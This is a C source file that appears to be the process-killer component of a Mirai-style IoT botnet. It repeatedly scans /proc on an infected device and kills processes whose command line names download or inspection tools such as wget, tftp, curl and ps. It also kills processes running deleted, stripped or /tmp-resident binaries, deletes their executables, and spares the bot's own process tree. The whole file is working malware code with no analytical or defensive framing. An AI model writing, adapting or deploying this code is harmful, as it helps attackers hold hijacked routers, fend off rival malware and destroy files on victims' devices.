#define _GNU_SOURCE

#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <elf.h>
#include "headers/killer.h"

volatile int killer_active = 0;
static pid_t killer_pid = 0;
static pid_t killer_ppid = 0;
static pid_t bot_pid = 0;
static const char *blacklist[] = {"wget", "tftp", "curl", "ftpget", "ftp", "ps", NULL};
static const char *safe_paths[] = {
    "/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/", "/usr/local/bin/", "/usr/local/sbin/",
    "/lib/", "/lib64/", "/usr/lib/", "/usr/lib64/",
    "/opt/", "/var/lib/", "/usr/share/",
    "/fhrom/", "/fhrom/fhshell/", "/fhrom/bin/", //some routers bin paths
    "/proc/self/exe", "/init", "/sbin/init",
    "/package/admin/", "/package/", "/command/",
    NULL
};

static const char *safe_processes[] = {
    "s6-supervise", "s6-linux-init", "sudo", "init",
    "systemd", "supervisord", "cron", "daemon",
    "dbus", "login", "sshd", "shell", "bash", NULL
};

static pid_t get_process_ppid(pid_t pid) {
    char path[64];
    FILE *f;
    pid_t ppid = 0;
    
    snprintf(path, sizeof(path), "/proc/%d/stat", pid);
    if ((f = fopen(path, "r")) != NULL) {
        fscanf(f, "%*d %*s %*c %d", &ppid);
        fclose(f);
    }
    return ppid;
}

static int is_process_parent(pid_t child, pid_t parent) {
    while (child > 1) {
        pid_t ppid = get_process_ppid(child);
        if (ppid == parent) return 1;
        if (ppid <= 1 || ppid == child) break;
        child = ppid;
    }
    return 0;
}

static int is_bot_process(const char *pid) {
    pid_t process_pid = atoi(pid);
    char path[64], comm[64];
    int fd;

    if (process_pid == killer_pid || 
        process_pid == killer_ppid || 
        process_pid == bot_pid || 
        is_process_parent(killer_pid, process_pid)) {
        return 1;
    }
    
    snprintf(path, sizeof(path), "/proc/%s/comm", pid);
    if ((fd = open(path, O_RDONLY)) != -1) {
        int len = read(fd, comm, sizeof(comm)-1);
        close(fd);
        if (len > 0) {
            comm[len] = 0;
            if (strstr(comm, "-sh")) {
                pid_t current = process_pid;
                while (current > 1) {
                    pid_t parent = get_process_ppid(current);
                    if (parent == bot_pid || parent == killer_pid) {
                        return 1;
                    }
                    if (parent <= 1 || parent == current) break;
                    current = parent;
                }
            }
        }
    }
    return 0;
}

static int is_daemonized_local_process(const char *pid) {
    char path[64], buf[256], exe_path[256];
    FILE *f;
    int fd, score = 0;

    snprintf(path, sizeof(path), "/proc/%s/exe", pid);
    ssize_t len = readlink(path, exe_path, sizeof(exe_path)-1);
    if (len > 0) {
        exe_path[len] = '\0';
        if (strncmp(exe_path, "./", 2) == 0 || exe_path[0] != '/') {
            score += 30;
        }
    }

    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
    if ((f = fopen(path, "r")) != NULL) {
        int ppid;
        fscanf(f, "%*d %*s %*c %d", &ppid);
        fclose(f);
        if (ppid == 1) score += 25;
    }

    snprintf(path, sizeof(path), "/proc/%s/status", pid);
    if ((f = fopen(path, "r")) != NULL) {
        while (fgets(buf, sizeof(buf), f)) {
            if (strncmp(buf, "SigCgt:", 7) == 0) {
                unsigned long long sigmask;
                sscanf(buf + 7, "%llx", &sigmask);
                if (sigmask & ((1ULL << (SIGHUP-1)) | (1ULL << (SIGTERM-1)))) {
                    score += 20;
                }
                break;
            }
        }
        fclose(f);
    }
    
    return score;
}

static int check_cmdline(const char *pid) {
    char path[64], buf[256];
    int fd;
    
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid);
    if ((fd = open(path, O_RDONLY)) != -1) {
        int len = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (len > 0) {
            buf[len] = 0;
            for (int i = 0; blacklist[i]; i++)
                if (strstr(buf, blacklist[i]))
                    return 75;
        }
    }
    return 0;
}

static int check_deleted(const char *pid) {
    char path[64], buf[256];
    snprintf(path, sizeof(path), "/proc/%s/exe", pid);
    if (readlink(path, buf, sizeof(buf)-1) != -1) {
        if (strstr(buf, " (deleted)"))
            return 75;
    }
    return 0;
}

static int check_path(const char *pid) {
    char path[64], buf[256];
    snprintf(path, sizeof(path), "/proc/%s/exe", pid);
    if (readlink(path, buf, sizeof(buf)-1) != -1) {
        if (strstr(buf, "/tmp/") || strstr(buf, "/dev/shm/") || strstr(buf, "/var/"))
            return 20;
    }
    return 0;
}

static int check_duplicate(const char *pid) {
    char path[64], buf[256];
    DIR *dir = opendir("/proc");
    int count = 0, fd;

    if (dir) {
        struct dirent *ent;
        while ((ent = readdir(dir))) {
            if (ent->d_type == DT_DIR && atoi(ent->d_name) > 0) {
                snprintf(path, sizeof(path), "/proc/%s/cmdline", ent->d_name);
                if ((fd = open(path, O_RDONLY)) != -1) {
                    if (read(fd, buf, sizeof(buf)-1) > 0 && strstr(buf, pid))
                        count++;
                    close(fd);
                }
            }
        }
        closedir(dir);
    }
    return (count > 2) ? 15 : 0;
}

static int check_stripped(const char *pid) {
    char path[64], buf[256];
    int fd, score = 0;
    Elf64_Ehdr eh;
    
    snprintf(path, sizeof(path), "/proc/%s/exe", pid);
    if ((fd = open(path, O_RDONLY)) != -1) {
        if (read(fd, &eh, sizeof(eh)) == sizeof(eh)) {
            if (memcmp(eh.e_ident, ELFMAG, SELFMAG) == 0) {
                if (eh.e_shoff == 0 || eh.e_shnum == 0)
                    score = 25;
            }
        }
        close(fd);
    }
    return score;
}

static void remove_exe(const char *pid) {
    char path[64], exe[256];
    snprintf(path, sizeof(path), "/proc/%s/exe", pid);
    ssize_t len = readlink(path, exe, sizeof(exe)-1);
    if (len > 0) {
        exe[len] = '\0';
        unlink(exe);
    }
}

static int is_safe_path(const char *pid) {
    char path[64], buf[256];
    ssize_t len;

    snprintf(path, sizeof(path), "/proc/%s/exe", pid);
    len = readlink(path, buf, sizeof(buf)-1);
    if (len > 0) {
        buf[len] = 0;
        for (int i = 0; safe_paths[i]; i++) {
            if (strncmp(buf, safe_paths[i], strlen(safe_paths[i])) == 0)
                return 1;
        }
    }
    return 0;
}

static int check_process(const char *pid) {
    int score = 0;
    pid_t proc_pid = atoi(pid);
    
    score = is_daemonized_local_process(pid);
    if (score >= 75) {
        remove_exe(pid);
        return score;
    }
    
    score += check_deleted(pid);
    if (score >= 75) {
        remove_exe(pid);
        return score;
    }
    
    if (!is_safe_path(pid)) {
        score += check_stripped(pid);
        score += check_path(pid);
        
        if (score > 20) {
            score += check_duplicate(pid);
            if (score >= 75) {
                remove_exe(pid);
            }
        }
    }
    
    return score;
}

static int should_kill(const char *pid) {
    char path[64], exe_path[256] = {0}, buf[256];
    pid_t proc_pid = atoi(pid);
    FILE *f;
    struct stat st;
    unsigned long vm_size = 0;
    int is_suspicious = 0;
    
    if (proc_pid == 1 || proc_pid == getpid() || proc_pid == bot_pid)
        return 0;
        
    if (is_bot_process(pid))
        return 0;
        
    char comm[256];
    snprintf(path, sizeof(path), "/proc/%s/comm", pid);
    FILE *comm_f = fopen(path, "r");
    if (comm_f) {
        if (fgets(comm, sizeof(comm), comm_f)) {
            char *newline = strchr(comm, '\n');
            if (newline) *newline = '\0';
            
            for (int i = 0; safe_processes[i]; i++) {
                if (strstr(comm, safe_processes[i])) {
                    fclose(comm_f);
                    return 0;
                }
            }
        }
        fclose(comm_f);
    }

    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
    if ((f = fopen(path, "r")) != NULL) {
        char state;
        if (fscanf(f, "%*d %*s %c", &state) == 1 && state == 'Z') {
            fclose(f);
            return 1; 
        }
        fclose(f);
    }

    snprintf(path, sizeof(path), "/proc/%s/exe", pid);
    ssize_t len = readlink(path, exe_path, sizeof(exe_path)-1);
    if (len > 0) {
        exe_path[len] = '\0';
        if (strncmp(exe_path, "./", 2) == 0) {
            is_suspicious = 1;
        }
    }

    snprintf(path, sizeof(path), "/proc/%s/status", pid);
    if ((f = fopen(path, "r")) != NULL) {
        while (fgets(buf, sizeof(buf), f)) {
            if (strncmp(buf, "VmSize:", 7) == 0) {
                sscanf(buf + 7, "%lu", &vm_size);
                if (vm_size < 2000) {
                    is_suspicious = 1;
                }
                break;
            }
        }
        fclose(f);
    }

    snprintf(path, sizeof(path), "/proc/%s/comm", pid);
    if ((f = fopen(path, "r")) != NULL) {
        if (fgets(buf, sizeof(buf), f)) {
            if (strstr(buf, "-sh") || strstr(buf, "sh")) {
                char tty_path[64];
                snprintf(tty_path, sizeof(tty_path), "/proc/%s/fd/0", pid);
                char tty_link[256];
                ssize_t tty_len = readlink(tty_path, tty_link, sizeof(tty_link)-1);
                if (tty_len < 0 || strstr(tty_link, "?")) {
                    is_suspicious = 1;
                }
            }
        }
        fclose(f);
    }

    if (is_suspicious) {
        if (!is_safe_path(pid)) {
            return 1;
        }
    }
        
    if (proc_pid < 100) {
        return (check_cmdline(pid) >= 75);
    }

    if (check_cmdline(pid) >= 75)
        return 1;
        
    if (is_safe_path(pid))
        return 0;
        
    return (check_process(pid) >= 75);
}

void *killer_thread(void *arg) {
    DIR *dir;
    struct dirent *ent;
    
    while (killer_active) {
        if ((dir = opendir("/proc"))) {
            while ((ent = readdir(dir))) {
                if (ent->d_type == DT_DIR && atoi(ent->d_name) > 0) {
                    if (should_kill(ent->d_name)) {
                        pid_t pid = atoi(ent->d_name);
                        kill(pid, SIGTERM);
                        usleep(1000);
                        kill(pid, SIGKILL);
                        usleep(1000);
                        if (kill(pid, 0) == 0) {
                            kill(pid, SIGABRT);
                            usleep(1000);
                            kill(pid, SIGKILL);
                        }
                        
                        char path[64];
                        snprintf(path, sizeof(path), "/proc/%d/task/%d/children", pid, pid);
                        FILE *f = fopen(path, "r");
                        if (f) {
                            pid_t child;
                            while (fscanf(f, "%d", &child) == 1) {
                                kill(child, SIGKILL);
                            }
                            fclose(f);
                        }
                    }
                }
            }
            closedir(dir);
        }
        //Global killer sleep
        usleep(250000);
    }
    return NULL;
}

static void killer_sigchld_handler(int sig) {
    (void)sig;
    pid_t pid;
    int status;
    
    while ((pid = waitpid(-1, &status, WNOHANG)) > 0) {
        if (WIFSIGNALED(status) || WIFEXITED(status)) {
            kill(pid, SIGKILL);
            usleep(1000);
            kill(pid, SIGKILL);
        }
    }
}

void start_killer(void) {
    killer_active = 1;
    killer_pid = getpid();
    killer_ppid = getppid();
    
    bot_pid = killer_ppid;
    pid_t current = bot_pid;
    char comm[64], path[64];
    
    while (current > 1) {
        snprintf(path, sizeof(path), "/proc/%d/comm", current);
        int fd = open(path, O_RDONLY);
        if (fd != -1) {
            int len = read(fd, comm, sizeof(comm)-1);
            close(fd);
            if (len > 0) {
                comm[len] = 0;
                if (strstr(comm, "-sh")) {
                    bot_pid = current; 
                    break;
                }
            }
        }
        pid_t next = get_process_ppid(current);
        if (next <= 1 || next == current) break;
        current = next;
    }
    
    pthread_t thread;
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = killer_sigchld_handler;
    sa.sa_flags = SA_NOCLDWAIT;  
    sigaction(SIGCHLD, &sa, NULL);
    
    if (pthread_create(&thread, NULL, killer_thread, NULL) != 0)
        return;
    pthread_detach(thread);
}

void stop_killer(void) {
    killer_active = 0;
}
